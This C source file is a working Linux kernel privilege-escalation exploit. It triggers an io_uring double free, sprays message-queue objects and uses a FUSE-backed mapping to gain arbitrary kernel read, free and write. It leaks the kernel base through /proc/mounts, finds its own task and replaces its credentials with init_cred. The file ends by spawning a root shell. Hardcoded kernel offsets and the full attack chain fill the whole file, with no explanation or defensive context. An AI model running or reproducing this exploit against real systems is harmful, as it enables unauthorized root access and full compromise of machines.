#define FUSE_USE_VERSION 29
#define _GNU_SOURCE
#include <stdio.h>
#include <limits.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <liburing.h>
#include <pthread.h>
#include <sys/un.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <fuse.h>

#define QUEUE_DEPTH 5
/*
 * sqe->flags
 */
/* use fixed fileset */
#define IOSQE_FIXED_FILE    (1U << IOSQE_FIXED_FILE_BIT)
/* issue after inflight IO */
#define IOSQE_IO_DRAIN      (1U << IOSQE_IO_DRAIN_BIT)
/* links next sqe */
#define IOSQE_IO_LINK       (1U << IOSQE_IO_LINK_BIT)
/* like LINK, but stronger */
#define IOSQE_IO_HARDLINK   (1U << IOSQE_IO_HARDLINK_BIT)
/* always go async */
#define IOSQE_ASYNC     (1U << IOSQE_ASYNC_BIT)
/* select buffer from sqe->buf_group */
#define IOSQE_BUFFER_SELECT (1U << IOSQE_BUFFER_SELECT_BIT)
/* don't post CQE if request succeeded */
#define IOSQE_CQE_SKIP_SUCCESS  (1U << IOSQE_CQE_SKIP_SUCCESS_BIT)

/*
 * io_uring_setup() flags
 */
#define IORING_SETUP_IOPOLL (1U << 0)   /* io_context is polled */
#define IORING_SETUP_SQPOLL (1U << 1)   /* SQ poll thread */
#define IORING_SETUP_SQ_AFF (1U << 2)   /* sq_thread_cpu is valid */
#define IORING_SETUP_CQSIZE (1U << 3)   /* app defines CQ size */
#define IORING_SETUP_CLAMP  (1U << 4)   /* clamp SQ/CQ ring sizes */
#define IORING_SETUP_ATTACH_WQ  (1U << 5)   /* attach to existing wq */
#define IORING_SETUP_R_DISABLED (1U << 6)   /* start with ring disabled */
#define IORING_SETUP_SUBMIT_ALL (1U << 7)   /* continue submit on error */

/*
 * io_uring_enter(2) flags
 */
#define IORING_ENTER_GETEVENTS      (1U << 0)
#define IORING_ENTER_SQ_WAKEUP      (1U << 1)
#define IORING_ENTER_SQ_WAIT        (1U << 2)
#define IORING_ENTER_EXT_ARG        (1U << 3)
#define IORING_ENTER_REGISTERED_RING    (1U << 4)

//msg_msg userland buffer - defined in msg.h already
/*
   struct msgbuf {
   __kernel_long_t mtype;          // type of message
   char mtext[1];                  // message text
   };
   */

#define DATALEN_MSG 4048
#define ASYNC_STRUCT_SIZE 376//Exact size of io_async_msghdr
#define VICTIM_SLAB_SIZE 512//Exact size of io_async_msghdr
#define PROC_MOUNTS_SIZE 352
#define PAGE_SIZE 4096

#define TASK_NEXT 1104
#define TASK_COMM_FROM_NEXT 736
#define TASK_COMM_END_FROM_NEXT TASK_COMM_FROM_NEXT + 0x10
#define TASK_REAL_CRED_FROM_NEXT 712

#define SHOW_VFSMNT_OFFSET (0x28d1d0)
#define INIT_TASK (kbase + 0x18149c0)
#define INIT_CRED (kbase + 0x1850720)

#define MOV_EAX_PRDX_RET_49ff (kbase + 0x435901)

#define POP_RDI (kbase + 0xa45cd)
#define RET (kbase + 0xa45ce)

#define PRE_SPRAY_COUNT 0x8
#define POST_SPRAY_COUNT 0x8
#define SPRAYED_MSG_COUNT PRE_SPRAY_COUNT + (POST_SPRAY_COUNT / 2)

#define VICTIM_MTYPE 69

//FUSE vars
const char *fuse_root = "/tmp/pwn";
const char *fuse_free_path1 = "/1";
const char *fuse_free_path2 = "/11";
const char *fuse_write_path = "/2";
struct fuse_chan *chan = NULL;
struct fuse_session *fuse_sess = NULL;

void *fuse_mem = NULL;

char snd_buff[0x100] = "TEST";
char *arg_addr = "/tmp/pwning";

unsigned long kbase = -1;
char buff[3 * PAGE_SIZE];
char proc_mounts_leak[DATALEN_MSG + PROC_MOUNTS_SIZE];
char cred_leak[DATALEN_MSG + 0x20];
struct msgbuf *msg = (struct msgbuf *)buff;
unsigned long max_msgq_size = -1;

unsigned long current_arb_free = -1;
unsigned long current_arb_write = -1;

int client_fds[2] = {-1, -1};
int proc_fd = -1;
int qid = -1;
int spray_qid = -1;
int write_qid = -1;

struct io_uring ring;

void del_msgq(int qid){
    //Only qid is necessary, not even msgid_ds buffer
    msgctl(qid, IPC_RMID, NULL);
}

void clean(){
    if(chan != NULL){
        fuse_unmount(fuse_root, chan);
        chan = NULL;
    }

    if(ring.ring_fd){
        io_uring_queue_exit(&ring);
    }

    if(qid != -1){
        //del_msgq(qid); //Cannot delete it as it will crash :)
    }
}

void quit(){
    clean();
    printf("QUITTING!\n");
    exit(1);
}

void fatal(char *msg){
    puts(msg);
    quit();
}

void fatalerr(char *msg){
    perror(msg);
    quit();
}

//FUSE setup
int do_getattr( const char *path, struct stat *st ){
    printf("[FUSE do_getattr] path: %s\n", path);
    memset(st, 0, sizeof(struct stat));

    if(strcmp(path, fuse_free_path1) == 0 
        || strcmp(path, fuse_free_path2) == 0 
        || strcmp(path, fuse_write_path) == 0 ){
        st->st_mode = S_IFREG | 777;//chmod + isdir/file
        st->st_nlink = 1;//hardlinks
        st->st_size = 4*PAGE_SIZE;
    }

    return 0;
}

int do_read( const char *path, char *buffer, size_t size, off_t offset, __attribute__((unused)) struct fuse_file_info *fi ) {
    cpu_set_t set1;

    CPU_ZERO(&set1);
    CPU_SET(0, &set1);

    sched_setaffinity(gettid(), sizeof(cpu_set_t), &set1); //Same affinity as main

    printf("[FUSE do_read] size: %lu, offset: %ld, path: %s\n", size, offset, path);

    //Arbitrary free path
    if(strcmp(path, fuse_free_path1) == 0 || strcmp(path, fuse_free_path2) == 0){
        msg->mtype = 97;
        unsigned long *msg_msg = (unsigned long *)&msg->mtext[DATALEN_MSG];
        msg_msg[3] = current_arb_free; //What will be freed when resuming execution after FUSE

        //This allocation will be freed right after allocating and writing over - its good since it does not hog 
        //resources and still allows overwrite of msg_msg metadata
        if(msgsnd(qid, msg, DATALEN_MSG + ASYNC_STRUCT_SIZE - 8, IPC_NOWAIT) != -1){//allocate overlapping msg_seq
            fatal("Incorrect byte limits on queue");//This msgsnd should fail
        }

        //All data that was not read will be zeroed-out. It will occupy msg part of the msg_msg so we do not care
        return 0;
    }

    //Arbitrary write path
    if(strcmp(path, fuse_write_path) == 0){
        msg->mtype = 98;
        unsigned long *msg_msg = (unsigned long *)&msg->mtext[DATALEN_MSG];
        //Size does not really matter as the one which is originally provided on do_msgrcv is taken anyway
        //which is why we go with all these shenanigans
        //msg_msg[2] = DATALEN_MSG + 0x10; //sizeof cred + real_cred
        msg_msg[3] = current_arb_write; //What to write over - point to nullptr

        //Overlap 4k chunk with msg_seq
        if(msgsnd(write_qid, msg, DATALEN_MSG + 0x800, IPC_NOWAIT) != -1){
            fatal("Incorrect byte limits on queue");
        }
        for(int i = 0; i < 0x20; i+= 0x8){
            printf(" 0x%016lx ", *(unsigned long *)&cred_leak[DATALEN_MSG + i]);
        }
        printf("\n");
        memcpy(buffer, cred_leak, DATALEN_MSG + 0x10);
        
        return size;
    }

    return 0;
}

static struct fuse_operations fops = {
    .read = do_read,
    .getattr = do_getattr,
};

void *setup_fuse(__attribute__((unused)) void *arg){
    struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
    struct fuse *fuse;
    struct stat st;
    char cmd[0x100];

    strcpy(cmd, "mkdir ");
    strcat(cmd, fuse_root);
    if(stat(fuse_root, &st) != 0){
        system(cmd);
    }

    if(!(chan = fuse_mount(fuse_root, &args))){
        fatalerr("fuse_mount");
    }

    if(!(fuse = fuse_new(chan, &args, &fops, sizeof(fops), NULL))){
        fuse_unmount(fuse_root, chan);
        fatalerr("fuse_new");
    }

    fuse_sess = fuse_get_session(fuse);
    fuse_set_signal_handlers(fuse_sess);
    fuse_loop_mt(fuse);

    puts("Quitting fuse...");

    return NULL;
}

int setup_dummy_server(char *path){
    struct sockaddr_un addr;
    int sockfd = socket(AF_UNIX, SOCK_STREAM, 0);

    if(sockfd == -1){
        fatalerr("server socket()");
    }

    memset(&addr, 0, sizeof(struct sockaddr_un));
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, path, sizeof(addr.sun_path) - 1);

    if ((bind(sockfd, (struct sockaddr *)&addr, sizeof(addr))) != 0) {
        fatalerr("bind()");
    }

    // Now server is ready to listen and verification
    if ((listen(sockfd, QUEUE_DEPTH)) != 0) {
        fatalerr("listen()");
    }

    printf("Created local UNIX socket @ %s and listening. Need to clean it manually!\n", path);

    return sockfd;
}

int isText(unsigned long addr){
    return addr >= 0xffffffff80000000 && addr < 0xffffffffa0000000;
}

int isHeap(unsigned long addr){
    return addr >= 0xffff888000000000 && addr < 0xffffc88000000000;
}

void *server_handler(void *arg){
    struct sockaddr_in claddr;
    char msg[0x100];
    int connfd; 
    socklen_t len = sizeof(claddr);   
    long sockfd = (long)arg;


    while(1){
        // Accept the data packet from client and verification
        connfd = accept(sockfd, (struct sockaddr*)&claddr, &len);
        if (connfd < 0) {
            fatalerr("accept()");
        }
        read(connfd, msg, sizeof(msg));

        //printf("[SERVER] Received message: %s\n", msg);
    }
}

int connect_socket(char *path){
    struct sockaddr_un addr;
    int fd;

    fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if(fd == -1){
        fatalerr("socket()");
    }

    printf("Connecting to local socket @ %s\n", path);

    memset(&addr, 0, sizeof(struct sockaddr_un));
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, path, sizeof(addr.sun_path) - 1);

    if(connect(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        close(fd);
        fatalerr("connect()");
    }

    return fd;
}

void prepare_sqe(int sockfd, const struct msghdr *msg, __u8 flags){
    struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
    if(!sqe){
        fatal("io_uring_get_sqe");
    }

    io_uring_prep_sendmsg_zc(sqe, sockfd, msg, 0);//Last param here is setting msg_flags, not so interesting
    io_uring_sqe_set_flags(sqe, flags);//setting real sqe-flags here
    io_uring_sqe_set_data(sqe, NULL);//placeholder for now - when we retrieve CQE we can read that data
}

struct msghdr *get_msghdr(char *snd_buff){
    struct msghdr *snd_msg;
    struct iovec *snd_iov;

    snd_iov = malloc(sizeof(struct iovec));
    if(!snd_iov){
        fatalerr("malloc(struct iovec)");
    }

    snd_msg = malloc(sizeof(struct msghdr));
    if(!snd_msg){
        fatalerr("malloc(struct msghdr)");
    }
    snd_iov->iov_base = snd_buff;
    snd_iov->iov_len = strlen(snd_buff) + 1;

    snd_msg->msg_name = NULL;	// Socket is connected - otherwise it would be address of recipient
    snd_msg->msg_namelen = 0;
    snd_msg->msg_iov = snd_iov;
    snd_msg->msg_iovlen = 1;
    snd_msg->msg_control = NULL;
    snd_msg->msg_controllen = 0;

    return snd_msg;
}

void connect_and_prepare_msg(int sockfd, struct msghdr *msghdr, __u8 flags){
    prepare_sqe(sockfd, msghdr, flags);
}

static void debug_print(char *addr, size_t size){
    for(size_t i = 0; i <= size; i+=0x20){
        printf("0x%04lx:", (unsigned long)addr + i);
        size_t line_size;
        if((size - i) >= 0x20){
            line_size = 0x20;
        }else{
            line_size = size - i;
            if(line_size % 8){
                line_size += (0x8 - (line_size % 8));
            }
        }
        for(size_t j = 0x0; j < line_size; j+= 0x8){
            printf(" 0x%016lx", *(unsigned long *)&addr[i + j]);
        }
        printf("\n");
    }
}

//Setup msg_msg dummy object which will be used for arbitrary read/write
int setup_msgmsg(){
    int qid = msgget(IPC_PRIVATE, 0666);

    if (qid == -1){
        fatalerr("msgget");
    }

    return qid;
}

void setup_arbitrary_read(int target_qid){
    //Setup the victim msg_msg once
    msg->mtype = 77;
    memset(msg->mtext, 0, PAGE_SIZE * 2);
    //we need to first allocate msg_msg in correct slab
    if(msgsnd(target_qid, msg, ASYNC_STRUCT_SIZE - 0x30, 0) == -1){//0x30 is msg_msg headers size
        fatalerr("msgsnd");
    }
}

void spray_msgmsg(){
    memset(msg->mtext, 0, PAGE_SIZE * 2);

    //First spray obj-count-per-slab objects to make sure we have clean slab for us
    for(int i = 1; i <= PRE_SPRAY_COUNT; i++){
        msg->mtype = i;
        if(msgsnd(spray_qid, msg, ASYNC_STRUCT_SIZE - 0x30, IPC_NOWAIT) == -1){//allocate overlapping msg_seq
            fatal("msgsnd");
        }
    }

    //Then we will do the same but free every 2nd one - so we need to give them unique mtypes
    for(int i = PRE_SPRAY_COUNT + 1; i <= PRE_SPRAY_COUNT + POST_SPRAY_COUNT; i++){
        msg->mtype = i;
        if(msgsnd(spray_qid, msg, ASYNC_STRUCT_SIZE - 0x30, IPC_NOWAIT) == -1){
            fatal("msgsnd");
        }
    }

    for(int i = PRE_SPRAY_COUNT + 1; i <= PRE_SPRAY_COUNT + POST_SPRAY_COUNT; i+= 2){
        if(msgrcv(spray_qid, msg, ASYNC_STRUCT_SIZE - 0x30, i, IPC_NOWAIT) == -1){//this should free and poke holes
            fatal("msgrcv");
        }
    }
}

unsigned long leak_msgq_entry(){
    unsigned long msg_offset = 0x200;
    unsigned long size = 4 * msg_offset - 0x30;

    memset(msg->mtext, 0, PAGE_SIZE * 2);
    msg->mtype = 43;
    unsigned long *msg_msg = (unsigned long *)&msg->mtext[DATALEN_MSG];
    msg_msg[1] = 78;//m_type 
    msg_msg[2] = size; 
    if(msgsnd(spray_qid, msg, DATALEN_MSG + ASYNC_STRUCT_SIZE - 8, IPC_NOWAIT) == -1){//allocate overlapping msg_seq
        fatal("msgsnd");
    }

    msg->mtype = VICTIM_MTYPE;
    //Create msg - its msg_seq struct @ next ptr will be the victim for arb write
    if(msgsnd(spray_qid, msg, DATALEN_MSG + 0x800, IPC_NOWAIT) == -1){
        fatal("msgsnd");
    }

    //This loop exists since in some cases of subsequent exploitation, some messages get freed before we recv them 
    //one way or another. That way count is always off by 1 and we crash - we do can hack like below to take it
    //into account
    int current_spray_count = SPRAYED_MSG_COUNT;
    while(current_spray_count > PRE_SPRAY_COUNT){
        if (msgrcv(spray_qid, msg, size, current_spray_count--, IPC_NOWAIT | MSG_NOERROR | MSG_COPY) != -1){
            break;
        }
        printf("[*] Lost msg!\n");
    }

    debug_print(msg->mtext, size);

    for(int i = 1; i < 4; i++){
        unsigned long *msg_content = (unsigned long *)&msg->mtext[(msg_offset * i) - 0x30];
        //We need mtype to be equal 0x10 here so it will point to 4k chunk
        if(isHeap(*(msg_content + 1)) //prev_ptr
                && *(msg_content + 2) == 0x10){//proper size
            return *(msg_content + 1);    
        }
    }

    //del_msgq(spray_qid); //Cannot delete it as it will crash :)
    //fatal("Could not leak msg queue entry pointers through overflow"); 
    return 0;
}

void arbitrary_read(unsigned long addr, size_t size){
    struct msgbuf *msg = (struct msgbuf *)buff;

    msg->mtype = 23;
    unsigned long *msg_msg = (unsigned long *)&msg->mtext[DATALEN_MSG];
    msg_msg[1] = 2; //resetting mtype so we can find our message
    msg_msg[2] = DATALEN_MSG + size; //size of read, minus DATALEN_MSG
    msg_msg[3] = addr; //where to read from, remember first field is next_ptr so pointing before

    //This allocation will be freed right after allocating and writing over - its good since it does not hog 
    //resources and still allows overwrite of msg_msg metadata
    if(msgsnd(qid, msg, DATALEN_MSG + ASYNC_STRUCT_SIZE - 8, IPC_NOWAIT) != -1){//allocate overlapping msg_seq
        fatal("Incorrect byte limits on queue");//This msgsnd should fail
    }

    //When using MSG_COPY the identifier which we search for is simply nth allocated msg_msg struct
    //We allocate 1 such structure per prepare read since the struct above is freed immediately
    //First msg is taken by msg for hijacking RIP (index 0)
    if(msgrcv(qid, msg, DATALEN_MSG + size, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY) == -1){
        fatalerr("msgrcv");
    }

    debug_print(&msg->mtext[DATALEN_MSG], size);
}

unsigned long leak_base(){
    msg->mtype = 22;
    memset(msg->mtext, 0, PAGE_SIZE * 2);

    int size = PROC_MOUNTS_SIZE;
    //first allocate msg_seq struct which will get overlapped
    if(msgsnd(qid, msg, DATALEN_MSG + size - 8, 0) == -1){
        fatalerr("msgsnd");
    }

    //using proc_mounts structure for leak 
    proc_fd = open("/proc/mounts", O_RDONLY);
    if(proc_fd == -1){
        fatalerr("open(/proc/mounts)");
    }

    if(msgrcv(qid, msg, DATALEN_MSG + size, 0, IPC_NOWAIT | MSG_NOERROR ) == -1){
        fatalerr("msgrcv");
    }

    debug_print(&msg->mtext[DATALEN_MSG], size);

    close(proc_fd);
    proc_fd = -1;

    //Save this leak for later use - overwriting proc_mount struct
    memcpy(proc_mounts_leak, &msg->mtext, DATALEN_MSG + size);

    return (*(unsigned long *)&msg->mtext[DATALEN_MSG + 0x10]);
}

void set_msgq_qbytes(int qid, unsigned long qbytes){
    struct msqid_ds msqid_ds;
    memset(&msqid_ds, 0, sizeof(msqid_ds));
    msgctl(qid, IPC_STAT, &msqid_ds);//Fill in buffer with current options of msg queue
    if(max_msgq_size == -1uL){
        max_msgq_size = msqid_ds.msg_qbytes;
        printf("[*] Message queue can have maximum of 0x%lx bytes\n", max_msgq_size);
    }

    //Modifying only mode, making sure everything else is correct
    //We cannot exceed default count of qbytes unless we have special permissions
    msqid_ds.msg_qbytes = qbytes;
    msgctl(qid, IPC_SET, &msqid_ds);
}

void trigger_double_free(char *arg_addr, char *snd_buff){
    //Create new io_uring ring for every new double-free. We can reuse it as well
    //But sometimes on subsequent double-free triggers it fails non-deterministicly (not even callin io_clean_op)
    //Hard to debug that one so this is safer bet

    //First clean previous ring if initialized 
    if(ring.ring_fd){
        io_uring_queue_exit(&ring);
    }

    if(client_fds[0] != -1 || client_fds[1] != -1){
        close(client_fds[0]);
        close(client_fds[1]);
        client_fds[0] = client_fds[1] = -1;
    }

    if(io_uring_queue_init(QUEUE_DEPTH, &ring, 0)){//make pooling thread so we don't need enter?
        fatalerr("io_uring_queue_init()");
    } 

    client_fds[0] = connect_socket(arg_addr);
    client_fds[1] = connect_socket(arg_addr);
    connect_and_prepare_msg(client_fds[0], get_msghdr(snd_buff), 0);
    connect_and_prepare_msg(client_fds[1], (void *)-1, IOSQE_IO_DRAIN);
    io_uring_submit(&ring);
    printf("[*] Triggered double free\n");
}

int alloc_fuse_mem(const char * fuse_path){
    static int counter = 0;
    char fuse_full_path[0x100]; 

    strcpy(fuse_full_path, fuse_root);
    strcat(fuse_full_path, fuse_path);
   
    int flag = O_RDWR;
    if(++counter % 2){ //Prevent fuse caching
        flag = O_RDONLY;
    }

    int fusefd = open(fuse_full_path, flag);
    
    if(fusefd == -1){
        fatalerr("open fuse");
    }

    fuse_mem = mmap(0, PAGE_SIZE * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE, fusefd, 0);
    return fusefd;
}

void clean_fuse_mem(int fd){
    close(fd);
    munmap(fuse_mem, PAGE_SIZE * 2);
    fuse_mem = (void *)-1;
}

void arb_free(unsigned long chunk_to_free){
    static int counter = 0;
    const char *path = fuse_free_path1;
    if(counter++){
        path = fuse_free_path2;
    }
    int fuse_fd = alloc_fuse_mem(path);

    struct msgbuf *mapped_msg = fuse_mem;

    current_arb_free = chunk_to_free;
    //allocating object which has data we will overwrite target with 
    if(msgrcv(write_qid, mapped_msg, ASYNC_STRUCT_SIZE - 0x30, 999, IPC_NOWAIT | MSG_NOERROR | MSG_COPY) != -1){
        fatalerr("Incorrect fuse read - msgrcv should fail");
    }

    clean_fuse_mem(fuse_fd); 
}

void arb_write_cred(unsigned long target_addr){
    int fuse_fd = alloc_fuse_mem(fuse_write_path);
    unsigned long write_size = 0x10;

    struct msgbuf *mapped_msg = fuse_mem;

    current_arb_write = target_addr;


    //allocating object which has data we will overwrite target with 
    if(msgrcv(write_qid, mapped_msg, DATALEN_MSG + write_size, 999, IPC_NOWAIT | MSG_NOERROR | MSG_COPY) != -1){
        fatalerr("Incorrect fuse read - msgrcv should fail");
    }

    clean_fuse_mem(fuse_fd); 
}

void perform_arbitrary_write(unsigned long chunk_to_free, unsigned long cred_ptr){
    //Now we need to create proper freelist order
    write_qid = setup_msgmsg();

    trigger_double_free(arg_addr, snd_buff);
    
    //Allocating 4k chunk for later
    memset(msg->mtext, 0, PAGE_SIZE * 2);
    msg->mtype = 101;
    if(msgsnd(write_qid, msg, DATALEN_MSG, IPC_NOWAIT) == -1){
        fatal("msgsnd");
    }

    set_msgq_qbytes(write_qid, 0);
    arb_free(chunk_to_free);

    //Making a space in freelist so we do not have 2 consecutivne addresses pointing to same location
    if(msgrcv(write_qid, msg, DATALEN_MSG, 101, IPC_NOWAIT) == -1){
        fatalerr("msgrcv");
    }

    arb_free(chunk_to_free);
    
    printf("[*] Arbitrary 4k free done, performing arbitrary write...\n");//getchar();
   
    unsigned long *cred_buff_ptr = (unsigned long *)&cred_leak[DATALEN_MSG];
    cred_buff_ptr[0] = cred_buff_ptr[1] = INIT_CRED;

    arb_write_cred(cred_ptr);
}

unsigned long find_struct_in_list(unsigned long init_ptr, unsigned long chk_value, unsigned long chk_offset, int ptr_offset, int null_offset){
    unsigned long prev_ptr;
    unsigned long curr_ptr = prev_ptr = init_ptr;
    unsigned long target_value;
    do{
        printf("[*] Reading struct @ %016lx\n", curr_ptr);//getchar();
        int size_to_read = chk_offset + 0x8;
        //We need to read something that won't get copy allocated in kmalloc-512
        //slab
        if(size_to_read > 0x100 && size_to_read <= 0x200){
            size_to_read += 0x100;
        }
        arbitrary_read(curr_ptr, size_to_read);

        target_value = *(unsigned long *)&msg->mtext[DATALEN_MSG + chk_offset];
        //If we search backwards, simply read second value (0x8 offset)
        curr_ptr = *(unsigned long *)&msg->mtext[DATALEN_MSG + ptr_offset];
        if(prev_ptr == curr_ptr){
            fatal("[-] Did not overlap proper msg_msg - old data!\n");
        }
        printf("[*] Found 0x%016lx at the ptr offset 0x%08x\n", curr_ptr, ptr_offset);
        printf("[*] Target value 0x%016lx at the offset 0x%08lx\n", target_value, chk_offset);
        if(!isHeap(curr_ptr) && !isText(curr_ptr)){
            fatal("[-] No pointer found!\n");
        }
        //right now we are pointing to ptr in the list - we need to read 
        //starting from null value
        curr_ptr += null_offset;
        //Something for rewriting...
        if(target_value == chk_value && *(unsigned long *)"PWNEDPWN" == chk_value){
            return prev_ptr;
        }
        prev_ptr = curr_ptr;
    }while(target_value != chk_value);

    return curr_ptr;
}

unsigned long find_cred_ptr(){ 
    return find_struct_in_list(INIT_TASK + TASK_NEXT, 
            *(unsigned long *)"PWNEDPWN", TASK_COMM_FROM_NEXT, 0x8, -0x8) 
        + TASK_REAL_CRED_FROM_NEXT;
}

//Read from the last 8 bytes of existing msg_msg to make sure its null
unsigned long find_4k_msgmsg_addr(unsigned long msgq_entry){ 
    return find_struct_in_list(msgq_entry + VICTIM_SLAB_SIZE - 0x8, 
            78, 0x10, 0x0, -0x8) + 0x8;
}

unsigned long find_4k_next_addr(unsigned long msgq_entry){
    unsigned long target_msg = msgq_entry + PAGE_SIZE;
    printf("[*] Leaking value from addr %016lx\n", target_msg);

    arbitrary_read(target_msg - 0x8, 0x28);

    unsigned long msg_mtype = *(unsigned long *)&msg->mtext[DATALEN_MSG + 0x10];
    //If we search backwards, simply read second value (0x8 offset)
    unsigned long target_addr = *(unsigned long *)&msg->mtext[DATALEN_MSG + 0x20];
    if(msg_mtype == VICTIM_MTYPE && isHeap(target_addr)){
        //In our setup - if this returns legit ptr and not crash, we have next addr setup @ offset PAGE_SIZE. When order is swapper or on the edge of slab - need to tweak it a bit and spray more 4k objects
        return target_addr;
    }else{
        fatal("No 4k chunk to be freed found!\n");
        return 0;
    }
}

//Making sure slabs will be zeroed out so when allocating adjacent slabs
//We won't fail on arbitrary read (requires 0 before read target)
void clean_slabs(int slab_size){ 
    memset(msg->mtext, 0, PAGE_SIZE * 2);
    int max_count = 0x4000 / slab_size;
    for(int i = 0; i < max_count; i++){
        msg->mtype = 50 + i;
        if(msgsnd(spray_qid, msg, slab_size - 0x30, IPC_NOWAIT) == -1){
            fatal("msgsnd");
        }
    }

    //Reverse order so normally our target slabs are after holes - when randomized
    //will just retry until hit
    for(int i = max_count - 1; i >= 0; i--){
        if(msgrcv(spray_qid, msg, slab_size - 0x30, 50 + i, IPC_NOWAIT) == -1){//this should free and poke holes
            fatal("msgrcv");
        }
    }
}

int main(int argc, char **argv){
    if(argc == 2){
        arg_addr = argv[1];
    }
    else if(argc != 1){
        printf("Usage: %s [<socket name>] e.g. %s %s", argv[0], argv[0], arg_addr);
        exit(2);
    }

    struct stat fstat;
    if(stat(arg_addr, &fstat) == 0){
        if(!S_ISSOCK(fstat.st_mode)){ //verifying if file is unix socket, to prevent accidental overwrite
            fatal("non-socket path");
        }else{
            if(remove(arg_addr) == -1){
                fatalerr("remove()");
            }
        }
    }else if(errno != ENOENT){
        fatalerr("stat()");
    }

    long server_sock = setup_dummy_server(arg_addr);

    //Set affinity to be the same as FUSE - need to overlap memory on the same cpu_cache
    cpu_set_t set1;

    CPU_ZERO(&set1);
    CPU_SET(0, &set1);

    sched_setaffinity(gettid(), sizeof(cpu_set_t), &set1); //Same affinity as main

    pthread_t fuse_th;
    if(pthread_create(&fuse_th, NULL, setup_fuse, NULL)){
        fatalerr("pthread_create");
    }
    printf("[*] Initializing FUSE subsystem...\n");
    sleep(1);//Allow FUSE to setup correctly
    //setup listener server in another thread

    pthread_t th;
    if(pthread_create(&th, NULL, server_handler, (int *)server_sock) != 0){
        fatalerr("pthread_create()");
    }
    if(pthread_detach(th) != 0){
        fatalerr("pthread_detach()");
    }

    //to find our task_struct
    const char *name = "PWNEDPWN";
    prctl(PR_SET_NAME, name, 0, 0);

    unsigned long msgq_entry = 0;
    do{
        printf("[*] Leaking msg_msg entry pointer through overflow...\n");
        spray_qid = setup_msgmsg();
        printf("[*] Cleaning slabs...\n");
        clean_slabs(VICTIM_SLAB_SIZE);//Clean kmalloc-512 slabs
        clean_slabs(PAGE_SIZE);//Clean kmalloc-4k slabs

        spray_msgmsg();
        //Trigger double-free vuln only after spraying msg_msg objects
        trigger_double_free(arg_addr, snd_buff);

        setup_arbitrary_read(spray_qid);

        //printf("[*] Leaking msg_msg entry pointer through overflow...\n");getchar();
        msgq_entry = leak_msgq_entry();
    }while(msgq_entry == 0);    
    printf("[+] Found msg_msg entry @ 0x%016lx\n", msgq_entry);

    //We setup msgqueue with default limits and changing them after leaking kernel base
    //so any subsequent msgsend will allocate but fail
    qid = setup_msgmsg();

    trigger_double_free(arg_addr, snd_buff);

    unsigned long leak = leak_base();
    if(!isText(leak)){
        fatal("[-] Could not leak kernel base - try again");
    }
    kbase = leak - SHOW_VFSMNT_OFFSET; 

    printf("Kernel text is @ %016lx\n", kbase);

    setup_arbitrary_read(qid);

    //Changing queue limits
    set_msgq_qbytes(qid, 0);

    unsigned long cred_ptr = find_cred_ptr();
    printf("[+] Cred ptr to overwrite is @ 0x%016lx\n", cred_ptr);

    unsigned long msgmsg_chunk = find_4k_msgmsg_addr(msgq_entry);
    printf("[+] 4K read chunk @ address 0x%016lx\n", msgmsg_chunk);

    //This chunk is first 4k msg_msg
    //To prevent crashing, Let's just read the second (or nth) one using overflow
    //and we will know that prev_ptr also points to it
    //With randomized freelist we could just spray more of them with dedicated queue for 4k messages to always retrieve these addresses.

    unsigned long target_msgmsg = find_4k_next_addr(msgmsg_chunk);
    printf("[+] Target chunk @ 0x%016lx\n", target_msgmsg);

    //As we use new queue for arb_write, again performing double free and setting queue limits

    perform_arbitrary_write(target_msgmsg, cred_ptr);

    printf("[+] Should be root, enjoy your shell!");
    clean();
    execv("/bin/sh", (char *[]){"/bin/sh", NULL});
}
